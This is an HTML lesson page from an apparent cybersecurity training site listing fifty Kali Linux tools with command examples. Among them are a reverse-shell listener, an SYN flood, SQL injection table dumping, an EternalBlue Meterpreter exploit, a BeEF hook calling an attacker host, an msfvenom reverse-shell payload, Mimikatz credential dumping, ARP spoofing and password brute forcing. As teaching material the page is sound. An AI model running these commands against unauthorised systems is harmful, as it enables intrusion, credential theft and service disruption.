@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>CyberDefend Academy · Top 50 Kali Linux Tools</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ========== THEME VARIABLES (DARK MODE DEFAULT) ========== */
+        :root {
+            --primary: #00e676;
+            --primary-fg: #000000;
+            --body-fg: #ffffff;
+            --body-bg: #121212;
+            --body-quiet-color: #b0b0b0;
+            --body-loud-color: #ffffff;
+            --hairline-color: #272727;
+            --border-color: #353535;
+            --darkened-bg: #1e1e1e;
+            --selected-bg: #2a2a2a;
+            --header-bg: #1a1a1a;
+            --input-bg: #242424;
+        }
+
+        /* ========== LIGHT MODE ========== */
+        html[data-theme="light"] {
+            --primary: #02b3e4;
+            --primary-fg: #ffffff;
+            --body-fg: #1a2c3e;
+            --body-bg: #f5f7fc;
+            --body-quiet-color: #5c6f87;
+            --body-loud-color: #0b2b3b;
+            --hairline-color: #e6edf4;
+            --border-color: #eef2f8;
+            --darkened-bg: #ffffff;
+            --selected-bg: #e9f4fa;
+            --header-bg: #ffffff;
+            --input-bg: #f9fbfe;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', 'Segoe UI', system-ui, sans-serif; background: var(--body-bg); color: var(--body-fg); display: flex; flex-direction: column; min-height: 100vh; transition: background 0.3s, color 0.3s; }
+
+        /* ========== TOP NAVIGATION BAR ========== */
+        .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 40px; background: var(--header-bg); border-bottom: 1px solid var(--hairline-color); position: sticky; top: 0; z-index: 100; }
+        .nav-brand { display: flex; align-items: center; gap: 12px; text-decoration: none; }
+        .nav-logo-icon { background: var(--primary); color: var(--primary-fg); width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; box-shadow: 0 4px 10px rgba(0,230,118,0.2); }
+        .nav-brand-text h1 { font-size: 1.1rem; font-weight: 800; color: var(--body-loud-color); line-height: 1.2; }
+        .nav-brand-text span { font-size: 0.6rem; color: var(--body-quiet-color); font-weight: 600; }
+        
+        .top-nav-links { display: flex; gap: 25px; align-items: center; }
+        .top-nav-links a { color: var(--body-quiet-color); text-decoration: none; font-size: 0.9rem; font-weight: 600; transition: 0.2s; padding: 5px 0; border-bottom: 2px solid transparent; }
+        .top-nav-links a:hover { color: var(--body-fg); }
+        .top-nav-links a.active { color: var(--primary); border-bottom: 2px solid var(--primary); }
+        .top-nav-links a.login-btn { background: var(--primary); color: var(--primary-fg); padding: 8px 18px; border-radius: 8px; }
+
+        /* ========== MAIN CONTENT & LAYOUT ========== */
+        .main-content { max-width: 1400px; margin: 40px auto; padding: 0 20px; width: 100%; flex: 1; display: flex; gap: 30px; align-items: flex-start; }
+        
+        /* ========== LEFT SIDEBAR PANEL ========== */
+        .sidebar { width: 300px; flex-shrink: 0; background: var(--header-bg); border: 1px solid var(--hairline-color); border-radius: 20px; padding: 20px; position: sticky; top: 100px; max-height: calc(100vh - 120px); overflow-y: auto; }
+        .sidebar-header h3 { font-size: 0.9rem; color: var(--body-quiet-color); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid var(--hairline-color); }
+        .sidebar-nav ul { list-style: none; }
+        .sidebar-nav ul li { margin-bottom: 8px; }
+        .sidebar-nav ul li a { display: block; padding: 12px 15px; border-radius: 10px; text-decoration: none; color: var(--body-quiet-color); font-size: 0.9rem; font-weight: 600; transition: 0.2s; border: 1px solid transparent; }
+        .sidebar-nav ul li a:hover { background: var(--selected-bg); color: var(--body-fg); }
+        .sidebar-nav ul li a.active { background: rgba(0, 230, 118, 0.1); color: var(--primary); border-color: rgba(0, 230, 118, 0.3); }
+        
+        /* ========== RIGHT CONTENT AREA ========== */
+        .content-area { flex: 1; min-width: 0; }
+        .page-header { text-align: center; margin-bottom: 40px; }
+        .page-header h1 { font-size: 2.5rem; color: var(--body-loud-color); margin-bottom: 10px; }
+        .page-header p { color: var(--body-quiet-color); font-size: 1rem; max-width: 600px; margin: 0 auto; }
+
+        /* ========== CONTENT STYLES ========== */
+        .section-title { position: relative; margin-bottom: 2rem; padding-bottom: 0.5rem; color: var(--body-loud-color); font-weight: 700; font-size: 1.8rem; margin-top: 3rem; }
+        .section-title::after { content: ''; position: absolute; bottom: 0; left: 0; width: 60px; height: 4px; background-color: var(--primary); border-radius: 2px; }
+        .text-block { color: var(--body-quiet-color); font-size: 1rem; line-height: 1.6; margin-bottom: 1.5rem; }
+        
+        .tool-title { font-size: 1.3rem; color: var(--body-loud-color); margin-top: 2rem; margin-bottom: 0.5rem; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        .tool-title i { color: var(--primary); }
+        
+        ul, ol { color: var(--body-quiet-color); font-size: 0.95rem; line-height: 1.6; margin-bottom: 1.5rem; padding-left: 25px; }
+        li { margin-bottom: 8px; }
+
+        /* Code Blocks */
+        pre { background: var(--input-bg); padding: 15px; border-radius: 8px; border: 1px solid var(--hairline-color); overflow-x: auto; margin: 1.5rem 0; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; line-height: 1.5; color: var(--primary); }
+        pre code { color: var(--body-fg); }
+        .inline-code { background: var(--input-bg); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; color: var(--primary); }
+
+        /* Custom Alert Box */
+        .alert-info-custom { background-color: var(--selected-bg); border-left: 4px solid var(--primary); padding: 1.5rem; border-radius: 8px; margin: 2rem 0; color: var(--body-fg); }
+        .alert-info-custom h4 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.1rem; display: flex; align-items: center; gap: 8px; }
+        .alert-info-custom p { color: var(--body-quiet-color); font-size: 0.95rem; line-height: 1.6; }
+        .alert-info-custom ul { color: var(--body-quiet-color); font-size: 0.95rem; line-height: 1.8; padding-left: 20px; margin-top: 10px; }
+
+        /* ========== LESSON NAVIGATION BUTTONS ========== */
+        .lesson-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--hairline-color); }
+        .nav-btn { display: inline-flex; align-items: center; gap: 8px; background: var(--darkened-bg); color: var(--body-fg); padding: 12px 24px; border-radius: 10px; text-decoration: none; font-weight: 600; font-size: 0.9rem; border: 1px solid var(--hairline-color); transition: 0.2s; }
+        .nav-btn:hover { background: var(--selected-bg); border-color: var(--primary); color: var(--primary); }
+        .nav-btn.next { background: var(--primary); color: var(--primary-fg); border-color: var(--primary); }
+        .nav-btn.next:hover { opacity: 0.9; transform: translateY(-2px); }
+
+        /* ========== FOOTER ========== */
+        footer { margin-top: auto; background: var(--header-bg); border-top: 1px solid var(--hairline-color); padding: 40px 40px 20px 40px; }
+        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1.5fr; gap: 40px; max-width: 1200px; margin: 0 auto 30px auto; }
+        .footer-col h3 { font-size: 1.1rem; color: var(--body-loud-color); margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+        .footer-col p { color: var(--body-quiet-color); font-size: 0.85rem; line-height: 1.6; margin-bottom: 15px; }
+        .footer-col ul { list-style: none; }
+        .footer-col ul li { margin-bottom: 10px; }
+        .footer-col ul li a { color: var(--body-quiet-color); text-decoration: none; font-size: 0.85rem; transition: 0.2s; }
+        .footer-col ul li a:hover { color: var(--primary); }
+        .footer-btn { display: inline-block; background: var(--primary); color: var(--primary-fg); padding: 8px 16px; border-radius: 8px; text-decoration: none; font-size: 0.8rem; font-weight: 700; margin-top: 10px; }
+        .footer-bottom { text-align: center; padding-top: 20px; border-top: 1px solid var(--hairline-color); color: var(--body-quiet-color); font-size: 0.8rem; }
+
+        @media (max-width: 900px) {
+            .top-nav { padding: 15px 20px; flex-direction: column; gap: 15px; }
+            .top-nav-links { gap: 15px; flex-wrap: wrap; justify-content: center; }
+            .top-nav-links a { font-size: 0.8rem; }
+            .page-header h1 { font-size: 2rem; }
+            .footer-grid { grid-template-columns: 1fr; gap: 30px; text-align: center; }
+            .footer-col h3 { justify-content: center; }
+            .footer-col ul { padding: 0; }
+            .lesson-nav { flex-direction: column; gap: 15px; }
+            .main-content { flex-direction: column; }
+            .sidebar { width: 100%; position: relative; top: 0; max-height: none; margin-bottom: 20px; }
+        }
+    </style>
+</head>
+<body>
+<!-- CHECK SAVED THEME IMMEDIATELY -->
+<script>
+    const savedTheme = localStorage.getItem('cd_theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', savedTheme);
+</script>
+
+<!-- TOP NAVIGATION TABS -->
+<nav class="top-nav">
+    <a href="index.html" class="nav-brand">
+        <div class="nav-logo-icon">🛡️</div>
+        <div class="nav-brand-text">
+            <h1>CyberDefend</h1>
+            <span>Modern cybersecurity learning platform</span>
+        </div>
+    </a>
+    <div class="top-nav-links">
+        <a href="index.html">Dashboard</a>
+        <a href="courses.html">Courses</a>
+        <a href="messages.html">📝 Tasks & Submissions</a>
+        <a href="labs.html" class="active">Labs</a>
+        <a href="login.html" class="login-btn">Login</a>
+    </div>
+</nav>
+
+<!-- MAIN CONTENT WRAPPER -->
+<div class="main-content">
+    
+    <!-- LEFT SIDEBAR PANEL -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h3>Course Lessons</h3>
+        </div>
+        <nav class="sidebar-nav">
+            <ul>
+                <li><a href="network-roadmap.html">Network Roadmap</a></li>
+                <li><a href="security-roadmap.html">Security Roadmap</a></li>
+                <li><a href="labs.html">1. Networking Labs Overview</a></li>
+                <li><a href="nessus.html">2. Nessus Vulnerability Assessment</a></li>
+                <li><a href="damietta-port.html">3. Damietta Port Authority</a></li>
+                <li><a href="kali-tools.html" class="active">4. Top 50 Kali Linux Tools</a></li>
+                <li><a href="lesson-5.html">5. Lesson Five Title</a></li>
+            </ul>
+        </nav>
+    </aside>
+
+    <!-- RIGHT CONTENT AREA -->
+    <div class="content-area">
+        <div class="page-header">
+            <h1>Top 50 Kali Linux Tools</h1>
+            <p>Comprehensive Guide for Security Professionals. Understanding proper implementation is crucial for conducting thorough security evaluations while maintaining ethical and legal compliance.</p>
+        </div>
+
+        <!-- Section 1: Introduction -->
+        <section id="introduction">
+            <h2 class="section-title">Understanding the Kali Linux Security Ecosystem</h2>
+            <p class="text-block">Kali Linux has established itself as the premier penetration testing and security auditing platform, bundling over 600 security tools in a single distribution. Originally developed from BackTrack Linux, Kali provides security professionals, ethical hackers, and penetration testers with a comprehensive toolkit for assessing and improving security postures.</p>
+            
+            <div class="alert-info-custom">
+                <h4><i class="fas fa-sitemap"></i> Kali Tool Categories</h4>
+                <p>The Kali Linux toolkit is organized into distinct categories to help professionals select appropriate tools for specific assessment phases:</p>
+                <ul>
+                    <li>Information Gathering & Vulnerability Analysis</li>
+                    <li>Web Applications & Wireless Attacks</li>
+                    <li>Exploitation Tools & Forensics</li>
+                    <li>Password Attacks & Reverse Engineering</li>
+                    <li>Social Engineering & Post-Exploitation</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Section 2: Network Analysis -->
+        <section id="network-analysis">
+            <h2 class="section-title">Network Analysis and Scanning Tools</h2>
+            
+            <div class="tool-title"><i class="fas fa-network-wired"></i> 1. Nmap (Network Mapper)</div>
+            <p class="text-block">Nmap remains the gold standard for network discovery and security auditing, offering unparalleled flexibility in network reconnaissance.</p>
+            <pre><code># Comprehensive network scan with service detection
+nmap -sV -sC -O -A -T4 192.168.1.0/24
+
+# Stealth SYN scan with timing optimization
+nmap -sS -T2 -p- --max-retries 1 --min-rate 100 target.com
+
+# Script-based vulnerability scanning
+nmap --script vuln --script-args=unsafe=1 192.168.1.100
+
+# Advanced firewall evasion techniques
+nmap -sS -f --mtu 24 --data-length 1337 -D RND:10 --spoof-mac 0 192.168.1.1</code></pre>
+
+            <div class="tool-title"><i class="fas fa-bolt"></i> 2. Masscan</div>
+            <p class="text-block">Masscan provides Internet-scale port scanning capabilities with extraordinary speed.</p>
+            <pre><code># High-speed port scanning
+masscan -p1-65535 192.168.1.0/24 --rate=1000
+
+# Banner grabbing with output formatting
+masscan -p80,443,445,22 10.0.0.0/8 --banners --source-port 61000 -oJ scan_results.json</code></pre>
+
+            <div class="tool-title"><i class="fas fa-terminal"></i> 3. Netcat (nc)</div>
+            <p class="text-block">The "Swiss Army knife" of networking tools, essential for various security tasks.</p>
+            <pre><code># Reverse shell listener
+nc -nlvp 4444
+
+# Port scanning
+nc -zvn 192.168.1.100 1-1000 2>&amp;1 | grep succeeded
+
+# File transfer (Receiver)
+nc -l -p 1234 > received_file.txt</code></pre>
+
+            <div class="tool-title"><i class="fas fa-wifi"></i> 4. Wireshark</div>
+            <p class="text-block">The premier packet analysis tool for deep network inspection.</p>
+            <pre><code># Command-line capture with tshark
+tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri
+
+# Extract files from packet capture
+tshark -r capture.pcap --export-objects "http,extracted_files"</code></pre>
+
+            <div class="tool-title"><i class="fas fa-server"></i> 5. Hping3</div>
+            <p class="text-block">Advanced packet crafting tool for security testing.</p>
+            <pre><code># SYN flood testing
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com
+
+# Traceroute using different protocols
+hping3 --traceroute -V -S -p 80 target.com</code></pre>
+        </section>
+
+        <!-- Section 3: Web Application Testing -->
+        <section id="web-app-testing">
+            <h2 class="section-title">Web Application Testing Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-globe"></i> 6. Burp Suite</div>
+            <p class="text-block">The industry-standard web application security testing platform. It acts as a proxy, allowing interception and modification of HTTP requests.</p>
+
+            <div class="tool-title"><i class="fas fa-shield-alt"></i> 7. OWASP ZAP (Zed Attack Proxy)</div>
+            <p class="text-block">Open-source web application security scanner.</p>
+            <pre><code># Start ZAP in daemon mode
+zap.sh -daemon -port 8090 -host 0.0.0.0
+
+# Command-line quick scan
+zap-cli --zap-url http://127.0.0.1:8090 -p 8090 quick-scan -s all -r http://target.com</code></pre>
+
+            <div class="tool-title"><i class="fas fa-database"></i> 8. SQLMap</div>
+            <p class="text-block">Automated SQL injection detection and exploitation tool.</p>
+            <pre><code># Basic SQL injection test
+sqlmap -u "http://target.com/page?id=1" --batch --risk=3 --level=5
+
+# Database enumeration
+sqlmap -u "http://target.com/page?id=1" --dbs
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump</code></pre>
+
+            <div class="tool-title"><i class="fas fa-search"></i> 9. Nikto</div>
+            <p class="text-block">Web server vulnerability scanner.</p>
+            <pre><code># Comprehensive scan
+nikto -h http://target.com -o nikto_report.html -Format htm
+
+# Scan through proxy
+nikto -h http://target.com -useproxy http://localhost:8080</code></pre>
+
+            <div class="tool-title"><i class="fas fa-folder-tree"></i> 10. Dirb/Dirbuster</div>
+            <p class="text-block">Directory and file brute-forcing tools.</p>
+            <pre><code># Basic directory enumeration
+dirb http://target.com /usr/share/wordlists/dirb/common.txt
+
+# Recursive scanning with extensions
+dirb http://target.com -r -X .php,.txt,.bak</code></pre>
+        </section>
+
+        <!-- Section 4: Wireless Security -->
+        <section id="wireless-security">
+            <h2 class="section-title">Wireless Security Testing Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-broadcast-tower"></i> 11. Aircrack-ng Suite</div>
+            <p class="text-block">Comprehensive wireless security testing framework.</p>
+            <pre><code># Enable monitor mode
+airmon-ng start wlan0
+
+# Capture packets
+airodump-ng wlan0mon
+
+# Target specific network
+airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</code></pre>
+
+            <div class="tool-title"><i class="fas fa-key"></i> 12. Reaver/Bully</div>
+            <p class="text-block">WPS PIN brute-force tools.</p>
+            <pre><code># Reaver WPS attack
+reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1
+
+# Bully WPS attack with pixie dust
+bully wlan0mon -b 00:11:22:33:44:55 -d -v 3</code></pre>
+
+            <div class="tool-title"><i class="fas fa-magic"></i> 13. Wifite</div>
+            <p class="text-block">Automated wireless attack tool.</p>
+            <pre><code># Automated attack on all networks
+wifite
+
+# Target specific encryption types
+wifite --wep --wpa</code></pre>
+        </section>
+
+        <!-- Section 5: Exploitation Frameworks -->
+        <section id="exploitation">
+            <h2 class="section-title">Exploitation Framework Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-bug"></i> 14. Metasploit Framework</div>
+            <p class="text-block">The world's most used penetration testing framework.</p>
+            <pre><code># Start Metasploit console
+msfconsole
+
+# Use exploit module
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.50
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit</code></pre>
+
+            <div class="tool-title"><i class="fas fa-window-restore"></i> 15. BeEF (Browser Exploitation Framework)</div>
+            <p class="text-block">Browser-focused exploitation framework.</p>
+            <pre><code># Start BeEF
+beef-xss
+
+# Hook browsers with JavaScript
+&lt;script src="http://attacker-ip:3000/hook.js"&gt;&lt;/script&gt;</code></pre>
+
+            <div class="tool-title"><i class="fas fa-user-secret"></i> 16. Social Engineering Toolkit (SET)</div>
+            <p class="text-block">Comprehensive social engineering framework. Launch with <span class="inline-code">setoolkit</span>.</p>
+        </section>
+
+        <!-- Section 6: Password Cracking -->
+        <section id="password-cracking">
+            <h2 class="section-title">Password Cracking and Analysis Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-user-lock"></i> 17. John the Ripper</div>
+            <p class="text-block">Advanced password cracking tool.</p>
+            <pre><code># Basic password cracking
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Show cracked passwords
+john --show hashes.txt</code></pre>
+
+            <div class="tool-title"><i class="fas fa-microchip"></i> 18. Hashcat</div>
+            <p class="text-block">GPU-accelerated password recovery.</p>
+            <pre><code># Dictionary attack
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Brute force with mask
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l</code></pre>
+
+            <div class="tool-title"><i class="fas fa-fast-forward"></i> 19. Hydra</div>
+            <p class="text-block">Network login cracker.</p>
+            <pre><code># SSH brute force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
+
+# HTTP POST form
+hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid credentials"</code></pre>
+
+            <div class="tool-title"><i class="fas fa-stream"></i> 20. Medusa</div>
+            <p class="text-block">Parallel network login brute-forcer.</p>
+            <pre><code># Basic usage
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code></pre>
+        </section>
+
+        <!-- Section 7: Vulnerability Analysis -->
+        <section id="vuln-analysis">
+            <h2 class="section-title">Vulnerability Analysis Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-radar"></i> 21. OpenVAS</div>
+            <p class="text-block">Comprehensive vulnerability scanner. Start services with <span class="inline-code">gvm-start</span>.</p>
+
+            <div class="tool-title"><i class="fas fa-clipboard-check"></i> 22. Lynis</div>
+            <p class="text-block">Security auditing tool for Unix/Linux.</p>
+            <pre><code># System audit
+lynis audit system</code></pre>
+
+            <div class="tool-title"><i class="fas fa-spider"></i> 23. Wapiti</div>
+            <p class="text-block">Web application vulnerability scanner.</p>
+            <pre><code># Basic scan
+wapiti -u http://target.com</code></pre>
+        </section>
+
+        <!-- Section 8: Forensics -->
+        <section id="forensics">
+            <h2 class="section-title">Forensics and Information Gathering Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-project-diagram"></i> 24. Maltego</div>
+            <p class="text-block">Visual link analysis and data mining tool.</p>
+
+            <div class="tool-title"><i class="fas fa-satellite-dish"></i> 25. Recon-ng</div>
+            <p class="text-block">Web reconnaissance framework.</p>
+            <pre><code># Launch Recon-ng
+recon-ng
+
+# Module usage
+modules load recon/domains-hosts/google_site_web</code></pre>
+
+            <div class="tool-title"><i class="fas fa-envelope"></i> 26. theHarvester</div>
+            <p class="text-block">Email, subdomain and people names harvester.</p>
+            <pre><code># Basic domain search
+theHarvester -d target.com -b google</code></pre>
+
+            <div class="tool-title"><i class="fas fa-search-location"></i> 27. Dmitry</div>
+            <p class="text-block">Deepmagic Information Gathering Tool.</p>
+            <pre><code># All modules
+dmitry -winse target.com</code></pre>
+
+            <div class="tool-title"><i class="fas fa-magnifying-glass"></i> 28. Autopsy/Sleuth Kit</div>
+            <p class="text-block">Digital forensics platform.</p>
+            <pre><code># List partitions
+mmls disk.img
+
+# Recover deleted files
+tsk_recover -e disk.img recovered_files/</code></pre>
+        </section>
+
+        <!-- Section 9: Reverse Engineering -->
+        <section id="reverse-eng">
+            <h2 class="section-title">Reverse Engineering Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-code"></i> 29. Ghidra</div>
+            <p class="text-block">NSA's reverse engineering framework.</p>
+
+            <div class="tool-title"><i class="fas fa-laptop-code"></i> 30. Radare2</div>
+            <p class="text-block">Advanced command-line reverse engineering framework.</p>
+            <pre><code># Open binary
+r2 binary
+
+# Analysis
+aaa
+
+# Disassemble function
+pdf @ main</code></pre>
+
+            <div class="tool-title"><i class="fas fa-cogs"></i> 31. GDB (with PEDA/GEF/pwndbg)</div>
+            <p class="text-block">Enhanced debugger for reverse engineering.</p>
+            <pre><code># Start GDB
+gdb binary
+
+# Set breakpoint
+break main</code></pre>
+        </section>
+
+        <!-- Section 10: Exploit Dev -->
+        <section id="exploit-dev">
+            <h2 class="section-title">Exploitation Development Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-syringe"></i> 32. MSFVenom</div>
+            <p class="text-block">Payload generator and encoder.</p>
+            <pre><code># Windows reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe</code></pre>
+
+            <div class="tool-title"><i class="fas fa-book"></i> 33. Searchsploit</div>
+            <p class="text-block">Exploit database search tool.</p>
+            <pre><code># Basic search
+searchsploit apache 2.4</code></pre>
+
+            <div class="tool-title"><i class="fas fa-puzzle-piece"></i> 34. Pattern Create/Offset</div>
+            <p class="text-block">Buffer overflow development tools.</p>
+            <pre><code># Create pattern
+pattern_create -l 1000
+
+# Find offset
+pattern_offset -q 0x41396141</code></pre>
+        </section>
+
+        <!-- Section 11: MITM -->
+        <section id="mitm">
+            <h2 class="section-title">Network Spoofing and MITM Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-exchange-alt"></i> 35. Ettercap</div>
+            <p class="text-block">Comprehensive suite for MITM attacks.</p>
+            <pre><code># Text interface
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//</code></pre>
+
+            <div class="tool-title"><i class="fas fa-network-info"></i> 36. Bettercap</div>
+            <p class="text-block">Modern MITM framework.</p>
+            <pre><code># ARP spoofing
+set arp.spoof.targets 192.168.1.100
+arp.spoof on</code></pre>
+
+            <div class="tool-title"><i class="fas fa-comment-dots"></i> 37. Responder</div>
+            <p class="text-block">LLMNR, NBT-NS and MDNS poisoner.</p>
+            <pre><code># Basic usage
+responder -I eth0</code></pre>
+        </section>
+
+        <!-- Section 12: Mobile Security -->
+        <section id="mobile-security">
+            <h2 class="section-title">Mobile Security Testing Tools</h2>
+
+            <div class="tool-title"><i class="fab fa-android"></i> 38. Android Debug Bridge (ADB)</div>
+            <p class="text-block">Android device interaction tool.</p>
+            <pre><code># List devices
+adb devices
+
+# Shell access
+adb shell</code></pre>
+
+            <div class="tool-title"><i class="fas fa-mobile-alt"></i> 39. MobSF (Mobile Security Framework)</div>
+            <p class="text-block">Automated mobile app security testing.</p>
+
+            <div class="tool-title"><i class="fas fa-wrench"></i> 40. Frida</div>
+            <p class="text-block">Dynamic instrumentation toolkit.</p>
+            <pre><code># Attach to process
+frida -U com.example.app</code></pre>
+        </section>
+
+        <!-- Section 13: Cryptography -->
+        <section id="crypto">
+            <h2 class="section-title">Cryptography and Steganography Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-hashtag"></i> 41. Hashidentifier</div>
+            <p class="text-block">Hash type identification tool.</p>
+
+            <div class="tool-title"><i class="fas fa-image"></i> 42. Steghide</div>
+            <p class="text-block">Steganography tool for hiding data.</p>
+            <pre><code># Embed file
+steghide embed -cf image.jpg -ef secret.txt -p password</code></pre>
+
+            <div class="tool-title"><i class="fas fa-box-open"></i> 43. Binwalk</div>
+            <p class="text-block">Firmware analysis and extraction tool.</p>
+            <pre><code># Scan for embedded files
+binwalk firmware.bin
+
+# Extract files
+binwalk -e firmware.bin</code></pre>
+        </section>
+
+        <!-- Section 14: Post-Exploitation -->
+        <section id="post-exploit">
+            <h2 class="section-title">Post-Exploitation Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-user-ninja"></i> 44. Mimikatz</div>
+            <p class="text-block">Windows credential extraction tool.</p>
+            <pre><code># Standalone usage
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords</code></pre>
+
+            <div class="tool-title"><i class="fab fa-windows"></i> 45. PowerSploit</div>
+            <p class="text-block">PowerShell post-exploitation framework.</p>
+
+            <div class="tool-title"><i class="fas fa-terminal"></i> 46. Evil-WinRM</div>
+            <p class="text-block">Windows Remote Management shell.</p>
+            <pre><code># Basic connection
+evil-winrm -i 192.168.1.100 -u Administrator -p password</code></pre>
+        </section>
+
+        <!-- Section 15: Reporting -->
+        <section id="reporting">
+            <h2 class="section-title">Reporting and Documentation Tools</h2>
+
+            <div class="tool-title"><i class="fas fa-file-medical-alt"></i> 47. Dradis</div>
+            <p class="text-block">Collaboration and reporting framework.</p>
+
+            <div class="tool-title"><i class="fas fa-laptop-house"></i> 48. Faraday</div>
+            <p class="text-block">Collaborative penetration test IDE.</p>
+
+            <div class="tool-title"><i class="fas fa-tree"></i> 49. CherryTree</div>
+            <p class="text-block">Hierarchical note-taking application.</p>
+
+            <div class="tool-title"><i class="fas fa-chart-bar"></i> 50. Pipal</div>
+            <p class="text-block">Password analysis tool.</p>
+            <pre><code># Basic analysis
+pipal passwords.txt</code></pre>
+        </section>
+
+        <!-- Section 16: Best Practices -->
+        <section id="best-practices">
+            <h2 class="section-title">Best Practices & Legal Considerations</h2>
+            
+            <div class="alert-info-custom">
+                <h4><i class="fas fa-gavel"></i> Ethical Usage Framework</h4>
+                <p>Using Kali Linux tools requires strict adherence to legal and ethical guidelines:</p>
+                <ul>
+                    <li><strong>Always Obtain Written Authorization:</strong> Never test systems without explicit permission. Define clear scope and boundaries.</li>
+                    <li><strong>Maintain Professional Standards:</strong> Document all activities thoroughly. Protect client confidentiality.</li>
+                    <li><strong>Minimize System Impact:</strong> Avoid denial-of-service conditions. Test during agreed maintenance windows.</li>
+                </ul>
+            </div>
+
+            <p class="text-block">Mastery of these tools requires not just technical knowledge but also understanding of their appropriate application, legal implications, and integration possibilities. Continuous learning, hands-on practice, and staying informed about emerging threats and techniques will ensure these powerful tools are used to strengthen security rather than compromise it.</p>
+        </section>
+
+        <!-- LESSON NAVIGATION BUTTONS -->
+        <div class="lesson-nav">
+            <a href="damietta-port.html" class="nav-btn prev">
+                <i class="fas fa-arrow-left"></i> Return Back
+            </a>
+            <a href="lesson-5.html" class="nav-btn next">
+                Next Lesson <i class="fas fa-arrow-right"></i>
+            </a>
+        </div>
+
+    </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col">
+            <h3>🛡️ CyberDefend Academy</h3>
+            <p>Part of Accenture. We provide modern cybersecurity training, hands-on labs, and industry-recognized certifications to empower next-gen defenders.</p>
+        </div>
+        <div class="footer-col">
+            <h3>Explore</h3>
+            <ul>
+                <li><a href="index.html">Dashboard</a></li>
+                <li><a href="courses.html">Courses</a></li>
+                <li><a href="labs.html">Labs</a></li>
+                <li><a href="messages.html">Tasks & Submissions</a></li>
+            </ul>
+        </div>
+        <div class="footer-col">
+            <h3>Stay Connected</h3>
+            <p>Want to level up your skills? Start your journey today and become a certified cybersecurity professional.</p>
+            <a href="courses.html" class="footer-btn">Open learning path →</a>
+        </div>
+    </div>
+    <div class="footer-bottom">
+        © CyberDefend Academy · Part of Accenture
+    </div>
+</footer>
+
+</body>
+</html>
